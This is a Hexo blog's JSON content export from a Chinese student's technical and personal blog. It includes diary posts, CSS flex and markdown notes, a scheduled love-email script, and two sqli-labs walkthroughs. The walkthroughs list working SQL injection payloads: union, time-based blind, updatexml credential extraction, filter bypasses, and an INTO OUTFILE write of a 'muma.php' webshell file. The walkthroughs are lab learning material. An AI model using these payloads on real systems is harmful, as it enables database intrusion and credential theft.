{"meta":{"title":"小七快跑","subtitle":"沈小祺技术博客","description":null,"author":"LuckyQ","url":"https://luckyjq.github.io","root":"/"},"pages":[{"title":"","date":"2019-06-24T05:11:56.533Z","updated":"2019-06-24T05:11:56.533Z","comments":false,"path":"categories/index.html","permalink":"https://luckyjq.github.io/categories/index.html","excerpt":"","text":""},{"title":"","date":"2019-06-24T05:11:35.668Z","updated":"2019-06-24T05:11:35.668Z","comments":false,"path":"tags/index.html","permalink":"https://luckyjq.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Hello World","slug":"hello-world","date":"2019-06-24T04:31:41.808Z","updated":"2019-06-24T04:31:41.808Z","comments":true,"path":"2019/06/24/hello-world/","link":"","permalink":"https://luckyjq.github.io/2019/06/24/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"Hello World","slug":"test1","date":"2019-06-24T04:31:41.808Z","updated":"2019-06-24T05:03:35.967Z","comments":true,"path":"2019/06/24/test1/","link":"","permalink":"https://luckyjq.github.io/2019/06/24/test1/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[{"name":"test","slug":"test","permalink":"https://luckyjq.github.io/categories/test/"}],"tags":[{"name":"测试","slug":"测试","permalink":"https://luckyjq.github.io/tags/测试/"},{"name":"标签一","slug":"标签一","permalink":"https://luckyjq.github.io/tags/标签一/"}]},{"title":"sql注入学习,sqli-labs（23~28）全解","slug":"sqli-labs23~28","date":"2018-02-25T12:11:38.000Z","updated":"2018-02-25T12:22:14.057Z","comments":true,"path":"2018/02/25/sqli-labs23~28/","link":"","permalink":"https://luckyjq.github.io/2018/02/25/sqli-labs23~28/","excerpt":"sqli-labs是一个开学sql注入学习平台，很有系统性，适合初学者拿来学习练手~ 这里给出注入过程中的一些payload，包括task23~28的基础篇","text":"sqli-labs是一个开学sql注入学习平台，很有系统性，适合初学者拿来学习练手~ 这里给出注入过程中的一些payload，包括task23~28的基础篇 task 23~28task23屏蔽了# –注释符号，只能闭合绕过http://127.0.0.1/sqli-labs/Less-23/?id=1&#39; and ‘1’=’1 task24二次注入注册一个账户 admin’# 密码admin登录，然后修改密码，修改的实际上是admin的密码 问题语句 task24 注册时候的过滤也有问题，才会导致可以写入非法字符我在源代码里加了一句注册成功输出sql语句，注册成功后显示 task24.1 而实际数据库中添加的数据却是，然后修改密码时便构成了二次注入 task24.2 task25过滤了and和or绕过一：http://127.0.0.1/sqli-labs/Less-25/?id=2&#39; aandnd 1=1 %23绕过二：http://127.0.0.1/sqli-labs/Less-25/?id=2&#39; %26%26 1=1 %23其中%26是&amp;的url编码 task25.ahttp://127.0.0.1/sqli-labs/Less-25a/?id=2 aandnd 1=1%23 task26过滤了很多，and和or可以继续用&amp;&amp;和||替代然后使用引号闭合，这题主要是要绕过对空格的过滤 task26 网上有人说用%a0替换空格，试了下不行。据说是windows系统的缘故？这里给出另外一种思路，利用1或者0秒的sleep时间来判断 http://localhost/sqli-labs/Less-26/?id=1&#39; %26%26sleep(ascii(mid(database(),1,1))=116)%26%26’1’=’1 task26 task26 task26.a屏蔽了26的字符，还给$id加了一对括号http://localhost/sqli-labs/Less-26a/?id=1&#39;)%26%26sleep(ascii(mid(database(),1,1))=115)%26%26&#39;1&#39;=(‘1 task27直接用26关的payload就可以http://localhost/sqli-labs/Less-27/?id=1&#39; %26%26sleep(ascii(mid(database(),1,1))=115) %26%26’1’=’1 task27.a单引号变成了双引号http://localhost/sqli-labs/Less-27a/?id=1&quot;%26%26sleep(ascii(mid(database(),1,1))=116) %26%26”1”=”1 task28$id被单引号和括号包围，如何判断出来的？?id=1’报错?id=1’ and ‘1’=’1?id=1”不报错 http://localhost/sqli-labs/Less-28/?id=1&#39;)%26%26sleep(ascii(mid(database(),1,1))=115) %26%26’1’=(‘1 task28.a用28的就可以","categories":[],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://luckyjq.github.io/tags/sql注入/"},{"name":"web安全","slug":"web安全","permalink":"https://luckyjq.github.io/tags/web安全/"},{"name":"sqlmap","slug":"sqlmap","permalink":"https://luckyjq.github.io/tags/sqlmap/"}]},{"title":"sql注入学习,sqli-labs基础篇（1~22）全解","slug":"sqli-labs基础篇","date":"2018-02-24T12:09:38.000Z","updated":"2018-02-24T13:12:31.663Z","comments":true,"path":"2018/02/24/sqli-labs基础篇/","link":"","permalink":"https://luckyjq.github.io/2018/02/24/sqli-labs基础篇/","excerpt":"sqli-labs是一个开学sql注入学习平台，很有系统性，适合初学者拿来学习练手~ 这里给出注入过程中的一些payload，包括task1~22的基础篇","text":"sqli-labs是一个开学sql注入学习平台，很有系统性，适合初学者拿来学习练手~ 这里给出注入过程中的一些payload，包括task1~22的基础篇 task1~10 GET注入task1http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and 1=1 –+ task2http://127.0.0.1/sqli-labs/Less-2/?id=12232 union select 1,2,3 task3http://127.0.0.1/sqli-labs/Less-3/?id=2000&#39;) union select 1,2,3 %23 task4http://127.0.0.1/sqli-labs/Less-4/?id=2000&quot;) union select 1,2,3 %23 task5sqlmap跑 task5 task6sqlmap跑 task6 task7http://127.0.0.1/sqli-labs/Less-7/?id=1&#39;)) union select 1,2,’‘ into outfile ‘C:/phpstudy/PHPTutorial/WWW/muma.php’ %23 这里我的mysql设置了—secure-file-priv 关掉就可以成功了怎么关参考这个 task7（1） task7（2） task8Sqlmap跑 task6 task9Sqlmap跑 task6 task10http://127.0.0.1/sqli-labs/Less-10/?id=1&quot; and length(database())=8 and sleep(5) %23 task11~22 POST注入task11 task11 task12 task12 task13 task13 task14 task14 task15 task15 task16 task16 task17uname=admin&amp;passwd=a’ or updatexml(1,concat(0x7e,(select * from(select concat_ws(char(32,44,32),id,username,password) from users limit 0,1)biaobieming),0x7e),1) %23 task17 task18Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0’ or updatexml(1,concat(0x7e,database(),0x7e),1) and ‘1’=’1 task18 task19http://127.0.0.1/sqli-labs/Less-19/&#39; or updatexml(1,concat(0x7e,database()),1) and ‘1’=’1 task19 task20uname=hahaha’ union select 1,2,3 %23 task20 task21uname=JykgdW5pb24gc2VsZWN0IDEsMixlbWFpbF9pZCAgZnJvbSBlbWFpbHMj task21 task22uname=YSIgdW5pb24gc2VsZWN0IDEsMiwzIw==","categories":[],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://luckyjq.github.io/tags/sql注入/"},{"name":"web安全","slug":"web安全","permalink":"https://luckyjq.github.io/tags/web安全/"},{"name":"sqlmap","slug":"sqlmap","permalink":"https://luckyjq.github.io/tags/sqlmap/"}]},{"title":"用python给你发520封情书","slug":"用python给你发520封情书","date":"2018-02-22T07:22:11.552Z","updated":"2018-02-22T07:22:11.552Z","comments":true,"path":"2018/02/22/用python给你发520封情书/","link":"","permalink":"https://luckyjq.github.io/2018/02/22/用python给你发520封情书/","excerpt":"哈哈，好久不见啊！最近入了python的坑，感觉很好玩在网上看到一个不错的创意，用python发邮件表白，所以就有了今天这个小案例——用python给Ta发520封“我喜欢你”邮件。邮件内容包括一句言情的话、一张带有“我爱你”字样的电影截图。只要写好脚本，每天13:14分你的Ta就会自动收到这封爱的邮件哦标题是“喜欢你的XXX天”~","text":"哈哈，好久不见啊！最近入了python的坑，感觉很好玩在网上看到一个不错的创意，用python发邮件表白，所以就有了今天这个小案例——用python给Ta发520封“我喜欢你”邮件。邮件内容包括一句言情的话、一张带有“我爱你”字样的电影截图。只要写好脚本，每天13:14分你的Ta就会自动收到这封爱的邮件哦标题是“喜欢你的XXX天”~ 好啦，我们开始吧。首先我们需要获取资源，从哪里去找520张电影截图和言情的文字呢？我采用的是豆瓣和句子迷这两个网站。豆瓣上有一个相册，已经有人帮你准备好了几百张截图啦真的太棒了有木有，我们只要爬下图片链接下载到本地就可以了。爬取豆瓣图片的时候有坑哦，不要爬的太快了，太快了会被禁止访问的…所以我是两秒钟爬一张 豆瓣上的相册： 豆瓣相册 爬取图片后整理并重命名： 图片整理 好啦，图片有了我们就可以去找文字了。我采用的是句子迷这个网站，上面有许多不错的句子，大多是名著里面的名句~在这里要注意咯，爬取句子迷上的美句时也有坑…一个ip爬几十条就会被封，所以需要多找些代理ip… 爬完句子后整理如下： 句子整理 好啦，图片也有了，句子也有了，接下来只要再写一个发邮件的脚本就可以啦。菜鸟教程上有实例哦我把上面的案例改一改，每天自动读取一张图片一个句子然后给加入邮件内容发送 电脑上收到的邮件如下： 电脑邮件 手机qq上收到邮件： 手机qq收到邮件 emmmmmmmm…比较悲剧的是，不知道为什么，微信的邮箱收到邮件后显示不了图片…好伤心 手机qq收到邮件 最后，利用windows的计划任务，每天定时13：14分运行脚本，你的Ta就会自动收到爱的邮件啦~ 好啦，最后祝大家早日找到真爱因为刚学习python脚本写的比较乱也参考了不少网上案例，等我整理好代码后发在评论区给大家参考","categories":[],"tags":[{"name":"生活","slug":"生活","permalink":"https://luckyjq.github.io/tags/生活/"},{"name":"python","slug":"python","permalink":"https://luckyjq.github.io/tags/python/"}]},{"title":"大三生活开始","slug":"大三生活开始","date":"2017-09-04T14:06:45.000Z","updated":"2018-02-22T07:22:29.686Z","comments":true,"path":"2017/09/04/大三生活开始/","link":"","permalink":"https://luckyjq.github.io/2017/09/04/大三生活开始/","excerpt":"哈哈，时间过得真快啊！（果然一开篇就是这种套话）。恩…看了一下上一篇博客竟然是上学期最后一天写的，到现在已经九个月了！！！","text":"哈哈，时间过得真快啊！（果然一开篇就是这种套话）。恩…看了一下上一篇博客竟然是上学期最后一天写的，到现在已经九个月了！！！ 好吧，之间有一段时间没有弄博客，因为我觉得我理解的东西比较简单，然后我知道的知识点好像百度都可以查到，人也就懒了不想写。现在慢慢的学习才觉得基础是多么重要，你对一个知识点只有理解很透彻才可以写出好的博文，那种“感觉蛮简单的，我大概已经知道了，应该不用写吧;这个没有必要理解很透彻，等要用的时候再来看吧”的思想真是毒瘤啊，会一直欺骗自己给自己假象。好记性不如烂笔头，实践才会真的有收获。 又一张图 今天是大三第一天上课，也算一个新的开始吧。我觉得大三应该是转折和挑战自己的一年吧，你会开始面临很多选择。考研或者工作，是否继续在自己的专业深耕还是继续捣鼓自己感兴趣的方向。还有在学生组织的去留问题等等。其实自己现在也很迷，还没想清楚未来的路应该怎么走。但是，我很享受听歌胡乱码字的现在…恩，以后心烦的时候码字吧…等等，我这不是一个技术博客吗，快要被我的心情日志占领了… 大三继续努力吧！顺便立几个flag： 尽量十一点半前睡觉 每周跑三次步 每天看点文档，写点代码 乐观向上，好好对待身边的人 恩，就酱吧。","categories":[],"tags":[{"name":"生活","slug":"生活","permalink":"https://luckyjq.github.io/tags/生活/"}]},{"title":"我的2016","slug":"我的2016","date":"2016-12-30T11:59:45.000Z","updated":"2018-02-22T07:22:19.948Z","comments":true,"path":"2016/12/30/我的2016/","link":"","permalink":"https://luckyjq.github.io/2016/12/30/我的2016/","excerpt":"沈小祺的2016 时间过得真的很快，转眼之间已经站在2016的最后一天了。昨天还跟室友调侃，要不要写个年终总结之类的。中午无聊打开了自己的空间，看了看自己以前写的东西，讲真，虽然有那么点恶心，但是，留给自己更多的还是感动。所以，还是来写一写沈健祺的这一年吧，讲真，我也想知道自己这一年到底干了些什么。","text":"沈小祺的2016 时间过得真的很快，转眼之间已经站在2016的最后一天了。昨天还跟室友调侃，要不要写个年终总结之类的。中午无聊打开了自己的空间，看了看自己以前写的东西，讲真，虽然有那么点恶心，但是，留给自己更多的还是感动。所以，还是来写一写沈健祺的这一年吧，讲真，我也想知道自己这一年到底干了些什么。 先来看看我15年末也就是大一上的时候列下的愿望清单吧，要不是翻了翻以前的日志，我还真不知道我自己竟然还写过这种东西。 ▼ 愿望清单 2016年，好像这些愿望都实现了。只是第六点，“去一个想去的地方，和他们一起”。【和他们一起】，当时我写下这个的时候，想的是谁呢？ 我试着去回忆2016让我印象特别深刻的事情，可我却发现，可以说找不到？或者说感觉蛮多事都满印象深刻的所以便算不上深刻了？我大概是一个健忘的人，我妈跟我讲的话转身就忘了，初中、高中的记忆也留下不多，我不是一个爱怀念的人。 我的2016，当了社联的一个小部长，有了几个自己的小部员，我还记得当初自己争取当部长的时候自己说过的话，“我想有一个自己的团队，我想锻炼自己的能力”，只是现在看来，我对这帮孩子更多的是亏欠，想的永远和做的有差距，但是请一定要记住自己说过什么，许下过什么承诺。 我的2016，做了大概有100+左右的微信推送，但大多只是活动或者通知类的，自己真正满意的不会超过一只手。下学期的宣传工作该如何进行，好好想想吧。 我的2016成绩一般般，中等偏上一点，拿了两次B等奖学金，作业教的次数不多，大概是越来越浪了吧。不要抱怨什么班级学习氛围不好，想不想好好读书永远是你自己的事情，只是，如何定义好好读书这四个字？ 我的2016和初中朋友去了苏州和上海，行程匆匆，没有来得及看太多风景；和室友在国庆去了趟北京，买票晚了做了16个小时的硬座。 我的2016入门了java，学习了前端，感谢学长建立的学习圈，让一圈有共同爱好的人可以相互督促，相互学习。 我的2016，寒假给一个初中生补了几天课，赚了几百块钱，可以真正算是认识第一桶金吧，虽然我在小学的时候就开始做五毛钱30张卡片的生意了。暑假当了个队长，和七八个做了一次暑期实习，剪纸，皮影，陶艺，中华传统文化魅力无穷。 还有参加了这学期的迎新工作，每天暴走三四万步；和社联的小伙伴们一起来了次别墅行，嗨了一个晚上；终于拥有了自己的第一部微单，虽然还没有怎么好好玩过；大概还有几次聚餐，几次考试的焦虑，几百盘撸啊撸的开黑岁月吧，还有……应该还有还有好些事情吧，只是记不太清了。 再见了，2016。你好啊，2017。珍惜时光，生活加油。","categories":[],"tags":[{"name":"生活","slug":"生活","permalink":"https://luckyjq.github.io/tags/生活/"}]},{"title":"flex布局语法","slug":"flex布局语法","date":"2016-12-21T13:14:38.000Z","updated":"2018-02-22T07:22:45.502Z","comments":true,"path":"2016/12/21/flex布局语法/","link":"","permalink":"https://luckyjq.github.io/2016/12/21/flex布局语法/","excerpt":"Flex是Flexible Box的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。任何一个容器都可以指定为Flex布局。 Webkit内核的浏览器，必须加上-webkit前缀。 注意，设为Flex布局以后，子元素的float、clear和vertical-align属性将失效。","text":"Flex是Flexible Box的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。任何一个容器都可以指定为Flex布局。 Webkit内核的浏览器，必须加上-webkit前缀。 注意，设为Flex布局以后，子元素的float、clear和vertical-align属性将失效。 1.基本概念采用Flex布局的元素，称为Flex容器（flex container），简称”容器”。它的所有子元素自动成为容器成员，称为Flex项目（flex item），简称”项目”。 flex布局图 2.容器的属性 flex-direction:决定主轴的方向（即项目的排列方向） row（默认值）：主轴为水平方向，起点在左端。 row-reverse：主轴为水平方向，起点在右端。 column：主轴为垂直方向，起点在上沿。 column-reverse：主轴为垂直方向，起点在下沿。 flex-wrap:flex-wrap属性定义，如果一条轴线排不下，如何换行 nowrap（默认）：不换行 wrap：换行，第一行在上方 wrap-reverse：换行，第一行在下方 flex-flow:flex-direction属性和flex-wrap属性的简写形式，默认值为row nowrap justify-content:定义了项目在主轴上的对齐方式 flex-start（默认值）：左对齐 flex-end：右对齐 center： 居中 space-between：两端对齐，项目之间的间隔都相等。 space-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。 align-items:align-items属性定义项目在交叉轴上如何对齐 flex-start：交叉轴的起点对齐。 flex-end：交叉轴的终点对齐。 center：交叉轴的中点对齐。 baseline: 项目的第一行文字的基线对齐。 stretch（默认值）：如果项目未设置高度或设为auto，将占满整个容器的高度 align-content:定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用 3.项目的属性 order：定义项目的排列顺序。数值越小，排列越靠前，默认为0 flex-grow：定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大 如果所有项目的flex-grow属性都为1，则它们将等分剩余空间（如果有的话）。如果一个项目的flex-grow属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍 flex-shrink：定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小 如果所有项目的flex-shrink属性都为1，当空间不足时，都将等比例缩小。如果一个项目的flex-shrink属性为0，其他项目都为1，则空间不足时，前者不缩小 flex-basis：定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小 它可以设为跟width或height属性一样的值（比如350px），则项目将占据固定空间 flex：是flex-grow, flex-shrink 和 flex-basis的简写，默认值为0 1 auto。后两个属性可选 该属性有两个快捷值：auto (1 1 auto) 和 none (0 0 auto) align-self：align-self属性允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性。默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch auto flex-start flex-end center baseline stretch","categories":[],"tags":[{"name":"css3","slug":"css3","permalink":"https://luckyjq.github.io/tags/css3/"},{"name":"flex","slug":"flex","permalink":"https://luckyjq.github.io/tags/flex/"},{"name":"布局","slug":"布局","permalink":"https://luckyjq.github.io/tags/布局/"}]},{"title":"markdown语法","slug":"markdown语法","date":"2016-12-20T13:19:42.000Z","updated":"2018-02-22T07:22:37.675Z","comments":true,"path":"2016/12/20/markdown语法/","link":"","permalink":"https://luckyjq.github.io/2016/12/20/markdown语法/","excerpt":"非常简单方便的文本标记语言，基本上几分钟就能掌握。 常用语法 # 代表一级标题，## 代表二级标题，以此类推，###### 六级标题 - 代表无序列表 &gt; 代表引用，如下面（结束引用要前后都有空行）","text":"非常简单方便的文本标记语言，基本上几分钟就能掌握。 常用语法 # 代表一级标题，## 代表二级标题，以此类推，###### 六级标题 - 代表无序列表 &gt; 代表引用，如下面（结束引用要前后都有空行） 如果要显示代码，使用如下写法 ``` css(语言名称)代码内容代码内容``` 1.box &#123;width:100px;&#125; *** 代表分割线 *text* 代表斜体 **text** 代表加粗 ![text](URL) 插入图片的样式 [link](URL) 链接的样式 \\ 表示转义字符","categories":[],"tags":[{"name":"markdown","slug":"markdown","permalink":"https://luckyjq.github.io/tags/markdown/"}]}]}